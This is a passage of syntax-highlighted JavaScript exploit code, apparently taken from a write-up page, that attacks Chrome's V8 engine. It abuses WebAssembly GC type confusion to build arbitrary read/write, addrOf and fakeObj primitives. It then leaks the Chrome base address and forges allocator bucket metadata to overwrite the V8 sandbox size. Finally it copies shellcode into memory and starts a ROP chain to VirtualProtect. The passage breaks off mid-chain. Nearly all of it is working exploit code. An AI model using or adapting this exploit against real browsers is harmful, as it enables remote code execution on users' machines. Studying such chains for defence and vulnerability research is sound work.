          <span class="token function-variable function">i_get1</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">v</span><span class="token punctuation">)</span> <span class="token operator">=></span> wasm<span class="token punctuation">.</span><span class="token function">i_get1</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// any -> int (ofs 4)</span>
          i_set0 <span class="token operator">=</span> wasm<span class="token punctuation">.</span>i_set0<span class="token punctuation">;</span> <span class="token comment">// any, int -> void (ofs 0)</span>
          i_set1 <span class="token operator">=</span> wasm<span class="token punctuation">.</span>i_set1<span class="token punctuation">;</span> <span class="token comment">// any, int -> void (ofs 4)</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">reserve</span><span class="token punctuation">(</span><span class="token number">0x100000</span> <span class="token operator">-</span> <span class="token number">1000008</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 2. create any -> int* casting read/write functions</span>
        <span class="token function">reserve</span><span class="token punctuation">(</span><span class="token number">1000000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">reserve</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#123;</span>
          <span class="token keyword">let</span> builder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WasmModuleBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          builder<span class="token punctuation">.</span><span class="token function">startRecGroup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">let</span> oneRef <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">addStruct</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token function">makeField</span><span class="token punctuation">(</span>kWasmI32<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1000003, 1000004?</span>
          <span class="token keyword">let</span> struct <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">addStruct</span><span class="token punctuation">(</span><span class="token punctuation">[</span>
            <span class="token function">makeField</span><span class="token punctuation">(</span><span class="token function">wasmRefType</span><span class="token punctuation">(</span>oneRef<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
          <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1000005 (kAny), 1000006?</span>
          <span class="token keyword">let</span> funcSig <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">addType</span><span class="token punctuation">(</span>
            <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token function">wasmRefType</span><span class="token punctuation">(</span>struct<span class="token punctuation">)</span><span class="token punctuation">,</span> kWasmI32<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmI32<span class="token punctuation">]</span><span class="token punctuation">)</span>
          <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1000007</span>
          builder<span class="token punctuation">.</span><span class="token function">addStruct</span><span class="token punctuation">(</span><span class="token function">encodeTag</span><span class="token punctuation">(</span><span class="token number">0x133370001</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1000008</span>
          builder<span class="token punctuation">.</span><span class="token function">endRecGroup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

          builder
            <span class="token punctuation">.</span><span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">"ip_read"</span><span class="token punctuation">,</span> funcSig<span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">addBody</span><span class="token punctuation">(</span><span class="token punctuation">[</span>
              kExprLocalGet<span class="token punctuation">,</span>
              <span class="token number">0</span><span class="token punctuation">,</span>
              kGCPrefix<span class="token punctuation">,</span>
              kExprStructGet<span class="token punctuation">,</span>
              struct<span class="token punctuation">,</span>
              <span class="token operator">...</span><span class="token function">wasmUnsignedLeb</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">// oneRef = struct->oneRef</span>
              kGCPrefix<span class="token punctuation">,</span>
              kExprStructGet<span class="token punctuation">,</span>
              oneRef<span class="token punctuation">,</span>
              <span class="token operator">...</span><span class="token function">wasmUnsignedLeb</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">// i32 = oneRef->i32</span>
            <span class="token punctuation">]</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">exportFunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

          builder
            <span class="token punctuation">.</span><span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">"ip_write"</span><span class="token punctuation">,</span> funcSig<span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">addBody</span><span class="token punctuation">(</span><span class="token punctuation">[</span>
              kExprLocalGet<span class="token punctuation">,</span>
              <span class="token number">0</span><span class="token punctuation">,</span>
              kGCPrefix<span class="token punctuation">,</span>
              kExprStructGet<span class="token punctuation">,</span>
              struct<span class="token punctuation">,</span>
              <span class="token operator">...</span><span class="token function">wasmUnsignedLeb</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">// oneRef = struct->oneRef</span>
              kExprLocalGet<span class="token punctuation">,</span>
              <span class="token number">1</span><span class="token punctuation">,</span>
              kGCPrefix<span class="token punctuation">,</span>
              kExprStructSet<span class="token punctuation">,</span>
              oneRef<span class="token punctuation">,</span>
              <span class="token operator">...</span><span class="token function">wasmUnsignedLeb</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">// oneRef->i32 = val</span>
              kExprLocalGet<span class="token punctuation">,</span>
              <span class="token number">1</span><span class="token punctuation">,</span>
            <span class="token punctuation">]</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">exportFunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

          <span class="token keyword">let</span> instance <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">instantiate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">let</span> wasm <span class="token operator">=</span> instance<span class="token punctuation">.</span>exports<span class="token punctuation">;</span>

          <span class="token function-variable function">ip_read</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">v</span><span class="token punctuation">)</span> <span class="token operator">=></span> wasm<span class="token punctuation">.</span><span class="token function">ip_read</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// any -> int (ofs 0)</span>
          ip_write <span class="token operator">=</span> wasm<span class="token punctuation">.</span>ip_write<span class="token punctuation">;</span> <span class="token comment">// any, int -> void (ofs 0)</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">reserve</span><span class="token punctuation">(</span><span class="token number">0x100000</span> <span class="token operator">-</span> <span class="token number">1000008</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 3. create any -> externref casting functions</span>
        <span class="token keyword">const</span> externRefDummy <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
        <span class="token function">reserve</span><span class="token punctuation">(</span><span class="token number">1000000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">reserve</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#123;</span>
          <span class="token keyword">let</span> builder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WasmModuleBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          builder<span class="token punctuation">.</span><span class="token function">startRecGroup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">let</span> struct <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">addStruct</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token function">makeField</span><span class="token punctuation">(</span>kWasmExternRef<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1000005 (kAny)</span>
          <span class="token keyword">let</span> funcSig <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">addType</span><span class="token punctuation">(</span>
            <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token function">wasmRefType</span><span class="token punctuation">(</span>struct<span class="token punctuation">)</span><span class="token punctuation">,</span> kWasmExternRef<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmExternRef<span class="token punctuation">]</span><span class="token punctuation">)</span>
          <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1000006</span>
          <span class="token keyword">let</span> funcSig2 <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">addType</span><span class="token punctuation">(</span>
            <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmExternRef<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token function">wasmRefType</span><span class="token punctuation">(</span>struct<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
          <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1000007</span>
          builder<span class="token punctuation">.</span><span class="token function">addStruct</span><span class="token punctuation">(</span><span class="token function">encodeTag</span><span class="token punctuation">(</span><span class="token number">0x133370000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1000008</span>
          builder<span class="token punctuation">.</span><span class="token function">endRecGroup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          builder
            <span class="token punctuation">.</span><span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">"e_init"</span><span class="token punctuation">,</span> funcSig2<span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">addBody</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kExprLocalGet<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> kGCPrefix<span class="token punctuation">,</span> kExprStructNew<span class="token punctuation">,</span> struct<span class="token punctuation">]</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">exportFunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

          builder
            <span class="token punctuation">.</span><span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">"e_get"</span><span class="token punctuation">,</span> funcSig<span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">addBody</span><span class="token punctuation">(</span><span class="token punctuation">[</span>
              kExprLocalGet<span class="token punctuation">,</span>
              <span class="token number">0</span><span class="token punctuation">,</span>
              kGCPrefix<span class="token punctuation">,</span>
              kExprStructGet<span class="token punctuation">,</span>
              struct<span class="token punctuation">,</span>
              <span class="token operator">...</span><span class="token function">wasmUnsignedLeb</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token punctuation">]</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">exportFunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

          builder
            <span class="token punctuation">.</span><span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">"e_set"</span><span class="token punctuation">,</span> funcSig<span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">addBody</span><span class="token punctuation">(</span><span class="token punctuation">[</span>
              kExprLocalGet<span class="token punctuation">,</span>
              <span class="token number">0</span><span class="token punctuation">,</span>
              kExprLocalGet<span class="token punctuation">,</span>
              <span class="token number">1</span><span class="token punctuation">,</span>
              kGCPrefix<span class="token punctuation">,</span>
              kExprStructSet<span class="token punctuation">,</span>
              struct<span class="token punctuation">,</span>
              <span class="token operator">...</span><span class="token function">wasmUnsignedLeb</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
              kExprLocalGet<span class="token punctuation">,</span>
              <span class="token number">1</span><span class="token punctuation">,</span>
            <span class="token punctuation">]</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">exportFunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

          <span class="token keyword">let</span> instance <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">instantiate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">let</span> wasm <span class="token operator">=</span> instance<span class="token punctuation">.</span>exports<span class="token punctuation">;</span>

          <span class="token function-variable function">e_init</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> wasm<span class="token punctuation">.</span><span class="token function">e_init</span><span class="token punctuation">(</span>externRefDummy<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// void -> struct &#123;externref&#125;</span>
          <span class="token function-variable function">e_get</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">v</span><span class="token punctuation">)</span> <span class="token operator">=></span> wasm<span class="token punctuation">.</span><span class="token function">e_get</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> externRefDummy<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// any -> externref (ofs 0)</span>
          e_set <span class="token operator">=</span> wasm<span class="token punctuation">.</span>e_set<span class="token punctuation">;</span> <span class="token comment">// any, externref -> void (ofs 0)</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">reserve</span><span class="token punctuation">(</span><span class="token number">0x100000</span> <span class="token operator">-</span> <span class="token number">1000008</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">const</span> <span class="token constant">E</span> <span class="token operator">=</span> <span class="token function">e_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">const</span> <span class="token constant">I</span> <span class="token operator">=</span> <span class="token function">i_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1.1</span><span class="token punctuation">,</span> <span class="token number">2.2</span><span class="token punctuation">,</span> <span class="token number">0x101</span><span class="token punctuation">,</span> <span class="token number">0x202</span><span class="token punctuation">,</span> <span class="token number">0x2345678</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

        <span class="token keyword">const</span> conv_ab <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">const</span> conv_dv <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataView</span><span class="token punctuation">(</span>conv_ab<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">function</span> <span class="token function">i2u32</span><span class="token punctuation">(</span><span class="token parameter">val</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          conv_dv<span class="token punctuation">.</span><span class="token function">setInt32</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> val<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">return</span> conv_dv<span class="token punctuation">.</span><span class="token function">getUint32</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">function</span> <span class="token function">u2i32</span><span class="token punctuation">(</span><span class="token parameter">val</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          conv_dv<span class="token punctuation">.</span><span class="token function">setUint32</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> val<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">return</span> conv_dv<span class="token punctuation">.</span><span class="token function">getInt32</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">function</span> <span class="token function">caged_read</span><span class="token punctuation">(</span><span class="token parameter">ofs</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token function">i_set0</span><span class="token punctuation">(</span><span class="token constant">I</span><span class="token punctuation">,</span> ofs <span class="token operator">-</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">return</span> <span class="token function">i2u32</span><span class="token punctuation">(</span><span class="token function">ip_read</span><span class="token punctuation">(</span><span class="token constant">I</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">function</span> <span class="token function">caged_write</span><span class="token punctuation">(</span><span class="token parameter">ofs<span class="token punctuation">,</span> val</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token function">i_set0</span><span class="token punctuation">(</span><span class="token constant">I</span><span class="token punctuation">,</span> ofs <span class="token operator">-</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">ip_write</span><span class="token punctuation">(</span><span class="token constant">I</span><span class="token punctuation">,</span> <span class="token function">u2i32</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">function</span> <span class="token function">addrOf</span><span class="token punctuation">(</span><span class="token parameter">obj</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token function">e_set</span><span class="token punctuation">(</span><span class="token constant">E</span><span class="token punctuation">,</span> obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">return</span> <span class="token function">i2u32</span><span class="token punctuation">(</span><span class="token function">i_get0</span><span class="token punctuation">(</span><span class="token constant">E</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">function</span> <span class="token function">fakeObj</span><span class="token punctuation">(</span><span class="token parameter">ofs</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token function">i_set0</span><span class="token punctuation">(</span>ofs<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">return</span> <span class="token function">e_get</span><span class="token punctuation">(</span><span class="token constant">E</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">const</span> ab_addr <span class="token operator">=</span> <span class="token function">addrOf</span><span class="token punctuation">(</span>ab<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">/*for (let i = 0; i &lt; 0x30; i++) &#123;
        console.log(i.toString(16), caged_read(ab_addr + i).toString(16));
    &#125;*/</span>

        <span class="token comment">// length overwrite</span>
        <span class="token function">caged_write</span><span class="token punctuation">(</span>ab_addr <span class="token operator">+</span> <span class="token number">0x16</span><span class="token punctuation">,</span> <span class="token number">0x200000</span> <span class="token operator">&lt;&lt;</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">caged_write</span><span class="token punctuation">(</span>ab_addr <span class="token operator">+</span> <span class="token number">0x1e</span><span class="token punctuation">,</span> <span class="token number">0x200000</span> <span class="token operator">&lt;&lt;</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// offset overwrite (to zero!)</span>
        <span class="token function">caged_write</span><span class="token punctuation">(</span>ab_addr <span class="token operator">+</span> <span class="token number">0x26</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 0x00014000 -> 0</span>

        <span class="token keyword">const</span> dv <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataView</span><span class="token punctuation">(</span>ab<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">/*for (let i = 0x80; i &lt; 0xa0; i += 8) &#123;
        console.log(i.toString(16).padStart(3, '0'), dv.getBigUint64(0x1000 + i, true).toString(16));
    &#125;

    for (let i = 0; i &lt; 8; i++) &#123;
        const ofs = 0x10000 + i * 0x1000;
        console.log(ofs.toString(16).padStart(3, '0'), dv.getBigUint64(ofs, true).toString(16));
        await sleep();
    &#125;*/</span>

        <span class="token keyword">const</span> chrome_leak <span class="token operator">=</span> dv<span class="token punctuation">.</span><span class="token function">getBigUint64</span><span class="token punctuation">(</span><span class="token number">0x1090</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">const</span> ab_pa_leak <span class="token operator">=</span> dv<span class="token punctuation">.</span><span class="token function">getBigUint64</span><span class="token punctuation">(</span><span class="token number">0x1080</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// assert &amp;0x1fffff == 0x13fc0</span>
        <span class="token keyword">const</span> ab_partition_base <span class="token operator">=</span> ab_pa_leak <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token number">0x1ffffn</span><span class="token punctuation">;</span>

        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[+] chrome_leak:"</span><span class="token punctuation">,</span> chrome_leak<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[+] ab_pa_leak:"</span><span class="token punctuation">,</span> ab_pa_leak<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">checkUA</span><span class="token punctuation">(</span>chrome_leak<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">const</span> chrome_base <span class="token operator">=</span> chrome_leak <span class="token operator">-</span> base_leak_ofs<span class="token punctuation">;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[+] chrome_base:"</span><span class="token punctuation">,</span> chrome_base<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[*] ab_partition_base:"</span><span class="token punctuation">,</span> ab_partition_base<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// sbx escape via metadata->bucket forgery:</span>
        <span class="token comment">//   1. bucket->active_slot_spans_head = metadata => arbitrary address, known value write</span>
        <span class="token comment">//   2. --bucket->num_full_slot_spans</span>
        <span class="token comment">//   (constraints for both: bucket->num_full_slot_spans > 0)</span>
        <span class="token comment">// ...and many more</span>
        <span class="token comment">// use it to overwrite Sandbox size</span>
        dv<span class="token punctuation">.</span><span class="token function">setBigUint64</span><span class="token punctuation">(</span>
          <span class="token number">0x1090</span><span class="token punctuation">,</span>
          chrome_base <span class="token operator">+</span> base_tgt_ofs <span class="token operator">+</span> <span class="token number">0x28n</span> <span class="token operator">+</span> <span class="token number">0x2n</span><span class="token punctuation">,</span>
          <span class="token boolean">true</span>
        <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// size = base &lt;&lt; (2 * 8), covers all 64bit canonical addressing space</span>
        dv<span class="token punctuation">.</span><span class="token function">setBigUint64</span><span class="token punctuation">(</span><span class="token number">0x1098</span><span class="token punctuation">,</span> dv<span class="token punctuation">.</span><span class="token function">getBigUint64</span><span class="token punctuation">(</span><span class="token number">0x1098</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">1n</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        abs<span class="token punctuation">[</span>absctr<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[+] Sandbox size overwritten"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//dv.setBigUint64(0x1088, 0n, true);</span>
        <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">/*for (let i = 0x60; i &lt; 0xa0; i += 8) &#123;
        console.log(i.toString(16).padStart(3, '0'), dv.getBigUint64(0x1000 + i, true).toString(16));
    &#125;*/</span>

        <span class="token comment">// shellcode: [0x14000, 0x16000)</span>
        <span class="token comment">// ropchain: 0x1e000</span>
        <span class="token comment">// lpflOldProtect: 0x1eff0</span>
        <span class="token comment">// vtable: [0x1f000, 0x20000)</span>
        <span class="token comment">// scratchpad for fake bucket: [0x20000, +sizeof(bucket))</span>
        <span class="token comment">// scratchpad for opt: [0x21000, ...)</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> sc<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          dv<span class="token punctuation">.</span><span class="token function">setUint8</span><span class="token punctuation">(</span><span class="token number">0x14000</span> <span class="token operator">+</span> i<span class="token punctuation">,</span> sc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token comment">// VirtualProtect(base+0x10000, 0xf0000, PAGE_EXECUTE_READ, lpflOldProtect)</span>
        <span class="token keyword">function</span> <span class="token function">set_rop</span><span class="token punctuation">(</span><span class="token parameter">ofs<span class="token punctuation">,</span> val</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          dv<span class="token punctuation">.</span><span class="token function">setBigUint64</span><span class="token punctuation">(</span><span class="token number">0x1e000</span> <span class="token operator">+</span> ofs<span class="token punctuation">,</span> val<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">set_rop</span><span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">,</span> chrome_base <span class="token operator">+</span> pop_gadget<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">set_rop</span><span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">,</span> ab_partition_base <span class="token operator">+</span> <span class="token number">0x14000n</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// rcx</span>
        <span class="token function">set_rop</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0x2000n</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// rdx</span>
        <span class="token function">set_rop</span><span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token number">0x20n</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// r8 = PAGE_EXECUTE_READ</span>
        <span class="token function">set_rop</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span> ab_partition_base <span class="token operator">+</span> <span class="token number">0x1eff0n</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// r9 = lpflOldProtect</span>
        <span class="token function">set_rop</span><span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token number">0n</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// r10</span>
        <span class="token function">set_rop</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span> chrome_base <span class="token operator">+</span> prax_ret<span class="token punctuation">)</span><span class="token punctuation">;</span>
